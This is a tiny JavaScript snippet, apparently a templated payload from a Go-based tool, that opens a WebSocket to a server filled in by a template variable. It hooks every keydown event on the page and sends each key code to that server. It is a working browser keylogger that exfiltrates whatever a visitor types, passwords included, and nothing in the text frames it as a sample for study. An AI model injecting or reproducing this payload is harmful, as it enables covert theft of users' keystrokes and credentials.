(function(){
    var conn = new WebSocket("ws://{{.}}/ws") // 创建ws连接
    document.onkeydown=function(evt){
        s = evt.code 
        conn.send(s)
    }
})()